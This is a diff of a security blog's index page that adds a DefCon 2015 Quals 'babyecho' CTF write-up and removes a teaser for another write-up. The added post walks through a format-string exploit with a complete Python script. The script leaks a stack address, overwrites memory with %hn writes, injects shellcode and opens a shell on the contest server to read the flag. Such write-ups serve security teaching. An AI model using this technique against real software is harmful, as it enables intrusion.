@@ -9,9 +9,14 @@
   <meta name="author" content="GeeksSpeak">
 
   
-  <meta name="description" content="DefConCTF 2015 ROPBaby Writeup
+  <meta name="description" content="DefConCTF 2015 babycho Writeup
 Point = 1
-Category = Pwnable As the challenge name proved we should use ROP technique to read flag from the server ( &hellip;">
+Category = Pwnable babyecho_eb11fdf6e40236b1a37b7974c53b6c3d 1
+2
+3
+4
+5
+$ file &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -67,6 +72,362 @@ Category = Pwnable As the challenge name proved we should use ROP technique to r
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/05/18/defconctf-2015-quals-babyecho-writeup/">DefConCTF 2015 Quals - Babyecho Writeup</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-05-18T21:45:44+04:30'><span class='date'><span class='date-month'>May</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:45 pm</span></time>
+        
+           | <a href="/blog/2015/05/18/defconctf-2015-quals-babyecho-writeup/#disqus_thread"
+             data-disqus-identifier="http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-babyecho-writeup/">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><strong>DefConCTF 2015 babycho Writeup</strong><br/>
+<strong>Point = 1</strong><br/>
+<strong>Category = Pwnable</strong></p>
+
+<blockquote><p>babyecho_eb11fdf6e40236b1a37b7974c53b6c3d</p></blockquote>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ file babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
+</span><span class='line'>babyecho_eb11fdf6e40236b1a37b7974c53b6c3d: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=c9a66685159ad72bd157b521f05a85e2e427f5ee, stripped
+</span><span class='line'>$ checksec.sh --file babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
+</span><span class='line'>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+</span><span class='line'>Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   babyecho_eb11fdf6e40236b1a37b7974c53b6c3d</span></code></pre></td></tr></table></div></figure>
+
+
+<p>First try got my attention:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
+</span><span class='line'>Reading 13 bytes
+</span><span class='line'>%p%p%p%p
+</span><span class='line'>0xd0xa(nil)0xd
+</span><span class='line'>Reading 13 bytes</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There is format string vulnerability, and based on binary properties we should run our shellcode.</p>
+
+<p>but there&rsquo;s a limit, 13 bytes? right?</p>
+
+<p>time to take a look at binary in IDA, the main function is <code>sub_8048F3C</code>.
+some resolving symbols the function looks like this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>int sub_8048F3C()
+</span><span class='line'>{
+</span><span class='line'>  signed int v0; // eax@2
+</span><span class='line'>  int v3; // [sp+10h] [bp-410h]@1
+</span><span class='line'>  int v4; // [sp+1Ch] [bp-404h]@4
+</span><span class='line'>  int v5; // [sp+41Ch] [bp-4h]@1
+</span><span class='line'>
+</span><span class='line'>  v5 = *MK_FP(__GS__, 20);
+</span><span class='line'>  v3 = 13;
+</span><span class='line'>  setvbuf((int)off_80EA4C0, 0, 2, 0);
+</span><span class='line'>  signal(14, (int)sub_8048EB1);
+</span><span class='line'>  alarm(10);
+</span><span class='line'>  while ( 1 )
+</span><span class='line'>  {
+</span><span class='line'>    v0 = 1023;
+</span><span class='line'>    if ( v3 &lt;= 1023 )
+</span><span class='line'>      v0 = v3;
+</span><span class='line'>    v3 = v0;
+</span><span class='line'>    printf("Reading %d bytes\n", v0);
+</span><span class='line'>    reado((int)&v4, v3, 10);
+</span><span class='line'>    filter_n((int)&v4);
+</span><span class='line'>    printf((const char *)&v4);
+</span><span class='line'>    alarm(10);
+</span><span class='line'>  }
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>the <code>filter_n</code> function just checks for <code>%n</code> and filters it as <code>_n</code>.</p>
+
+<p>if i overwrite <code>v0</code> i can send my shellcode and return to it.</p>
+
+<p>i just need to know the offset, and gdb says it is 7:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Reading 13 bytes
+</span><span class='line'>%p%p%p%p
+</span><span class='line'>[-------------------------------------registers--------------------------------------]
+</span><span class='line'>EAX: 0xffffc86c ("%p%p%p%p")
+</span><span class='line'>EBX: 0x80481a8 (push   ebx)
+</span><span class='line'>ECX: 0x0 
+</span><span class='line'>EDX: 0xffffffff 
+</span><span class='line'>ESI: 0x0 
+</span><span class='line'>EDI: 0x80ea00c --&gt; 0x80660a0 (mov    edx,DWORD PTR [esp+0x4])
+</span><span class='line'>EBP: 0xffffcc78 --&gt; 0x80497d0 (push   ebx)
+</span><span class='line'>ESP: 0xffffc850 --&gt; 0xffffc86c ("%p%p%p%p")
+</span><span class='line'>EIP: 0x804900f (call   0x804f560)
+</span><span class='line'>[----------------------------------------code----------------------------------------]
+</span><span class='line'>   0x8049003:   call   0x8048ecf
+</span><span class='line'>   0x8049008:   lea    eax,[esp+0x1c]
+</span><span class='line'>   0x804900c:   mov    DWORD PTR [esp],eax
+</span><span class='line'>=&gt; 0x804900f:   call   0x804f560
+</span><span class='line'>   0x8049014:   mov    DWORD PTR [esp],0xa
+</span><span class='line'>   0x804901b:   call   0x804fde0
+</span><span class='line'>   0x8049020:   mov    DWORD PTR [esp],0x14
+</span><span class='line'>   0x8049027:   call   0x806cb50
+</span><span class='line'>Guessed arguments:
+</span><span class='line'>arg[0]: 0xffffc86c ("%p%p%p%p")
+</span><span class='line'>[---------------------------------------stack----------------------------------------]
+</span><span class='line'>00:0000| esp 0xffffc850 --&gt; 0xffffc86c ("%p%p%p%p")
+</span><span class='line'>01:0004|     0xffffc854 --&gt; 0xd (b'\r')
+</span><span class='line'>02:0008|     0xffffc858 --&gt; 0xa (b'\n')
+</span><span class='line'>03:0012|     0xffffc85c --&gt; 0x0 
+</span><span class='line'>04:0016|     0xffffc860 --&gt; 0xd (b'\r')
+</span><span class='line'>05:0020|     0xffffc864 --&gt; 0xffffc86c ("%p%p%p%p")
+</span><span class='line'>06:0024|     0xffffc868 --&gt; 0x0 
+</span><span class='line'>07:0028| eax 0xffffc86c ("%p%p%p%p")
+</span><span class='line'>[------------------------------------------------------------------------------------]
+</span><span class='line'>Legend: stack, code, data, heap, rodata, value
+</span><span class='line'>
+</span><span class='line'>Breakpoint 2, 0x0804900f in ?? ()</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Obviously, first i should leak the stack address at offset 5, then overwrite the <code>v0</code> so i send my shellcode, but the main part is how to break the loop. for this i just overwrite return address of <code>printf</code> and then jump to my shellcode.</p>
+
+<p>TL;DR
+Please check my implementation:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/python
+</span><span class='line'>
+</span><span class='line'>import socket
+</span><span class='line'>import struct
+</span><span class='line'>import telnetlib
+</span><span class='line'>
+</span><span class='line'>def readuntil(f, delim='\n'):
+</span><span class='line'>    data = ''
+</span><span class='line'>    while not data.endswith(delim):
+</span><span class='line'>        c = f.read(1)
+</span><span class='line'>        assert len(c) &gt; 0
+</span><span class='line'>        data += c
+</span><span class='line'>    #print data
+</span><span class='line'>    return data
+</span><span class='line'>
+</span><span class='line'>def p(v):
+</span><span class='line'>    return struct.pack('&lt;I', v)
+</span><span class='line'>
+</span><span class='line'>def u(v):
+</span><span class='line'>    return struct.unpack('&lt;I', v)[0]
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>#s = socket.create_connection(("127.0.0.1", 1337))
+</span><span class='line'>s = socket.create_connection(("babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me", 3232))
+</span><span class='line'>f = s.makefile('rw', bufsize=0)
+</span><span class='line'>
+</span><span class='line'>raw_input("$") # attach debugger
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>shellcode = (
+</span><span class='line'>"\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2"
+</span><span class='line'>          "\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69"
+</span><span class='line'>                  "\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81"
+</span><span class='line'>        )
+</span><span class='line'>
+</span><span class='line'>readuntil(f)
+</span><span class='line'>f.write("%p"*5+"\n")
+</span><span class='line'>loc =  int(readuntil(f)[:-1].split("0x")[-1], 16)  - 0x0c
+</span><span class='line'>
+</span><span class='line'>readuntil(f)
+</span><span class='line'>f.write(p(loc)+"%30u%7$n\n")
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>readuntil(f)
+</span><span class='line'>f.write(p(loc)+"%1200u%7$n\n")
+</span><span class='line'>
+</span><span class='line'>readuntil(f)
+</span><span class='line'>
+</span><span class='line'>wrl = loc+100 & 0xffff
+</span><span class='line'>wrh = (loc+100 &gt;&gt; 16 ) & 0xffff
+</span><span class='line'>
+</span><span class='line'>print hex(wrl), hex(wrh)
+</span><span class='line'>
+</span><span class='line'>payload = p(loc-0x14)+"%0{i}c".format(i=wrl)+"%0007$hn"+"%0{i}c".format(i=(wrh-wrl-8))+p(loc-0x12)+"%0014$hn"+p(loc-0x12)+"A"*48+shellcode+"A"*(1024 - 48 - len(shellcode))+"\n"
+</span><span class='line'>print payload
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>f.write(payload)
+</span><span class='line'>
+</span><span class='line'>print "[+] shell is ready: "
+</span><span class='line'>t = telnetlib.Telnet()
+</span><span class='line'>t.sock = s
+</span><span class='line'>t.interact()</span></code></pre></td></tr></table></div></figure>
+
+
+<p>there you go:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ python babyecho-expl.py
+</span><span class='line'>0x4a24 0xffd2
+</span><span class='line'>�I��%018980c%0007$hn%046502c
+</span><span class='line'>[...]
+</span><span class='line'>cat /home/babyecho/flag 
+</span><span class='line'>The flag is: 1s 1s th3r3 th3r3 @n @n 3ch0 3ch0 1n 1n h3r3 h3r3? 3uoiw!T0*%</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<p>@HAMIDx9</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -1436,56 +1797,6 @@ Doing so I found a picture of Sheldon &hellip; or better say <code>"Dr. Cooper"<
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/04/05/ndh-ctf-2015-updator-writeup/">NDH CTF 2015 - Updator Writeup</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-04-05T03:28:56+04:30'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>5</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>3:28 am</span></time>
-        
-           | <a href="/blog/2015/04/05/ndh-ctf-2015-updator-writeup/#disqus_thread"
-             data-disqus-identifier="http://geeksspeak.github.io/blog/2015/04/05/ndh-ctf-2015-updator-writeup/">Comments</a>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><strong>NDH 2015 Updator Writeup</strong><br/>
-<strong>Point = 200</strong><br/>
-<strong>Category = Exploit</strong></p>
-
-<blockquote><p>Unhackable : &ldquo;Not hackable; that cannot be hacked or broken into.&rdquo;
-We manage updates and thus have fixes, this is not a PS3 as it is unhackable &hellip; or is it?
-Score     200
-Link      <a href="http://updator.challs.nuitduhack.com/">http://updator.challs.nuitduhack.com/</a></p></blockquote>
-
-<p>openning the url gives us a login page and a update button. pressing update button shows an notification:</p>
-
-<blockquote><p>The update managing system is still under construction but will be available soon.</p></blockquote>
-
-<p>We noticed it&rsquo;s a python script <code>update.py</code>. So attempting to loading <code>update.pyc</code> gave us the permission to download the file. Instantly i tried to decompile the code with <code>uncompyle2</code> as:</p>
-
-</div>
-  
-  
-    <footer>
-      <a rel="full-article" href="/blog/2015/04/05/ndh-ctf-2015-updator-writeup/">Read on &rarr;</a>
-    </footer>
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/2">&larr; Older</a>
@@ -1501,6 +1812,10 @@ Link      <a href="http://updator.challs.nuitduhack.com/">http://updator.challs.
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2015/05/18/defconctf-2015-quals-babyecho-writeup/">DefConCTF 2015 Quals - Babyecho Writeup</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2015/05/18/defconctf-2015-quals-ropbaby-writeup/">DefConCTF 2015 Quals - ROPBaby Writeup</a>
       </li>
     
@@ -1514,10 +1829,6 @@ Link      <a href="http://updator.challs.nuitduhack.com/">http://updator.challs.
     
       <li class="post">
         <a href="/blog/2015/05/18/defconctf-2015-quals-babycmd-writeup/">DefConCTF 2015 Quals - Babycmd Writeup</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2015/04/20/plaidctf-ctf-2015-ebp-writeup/">PlaidCTF CTF 2015 - EBP Writeup</a>
       </li>
     
   </ul>
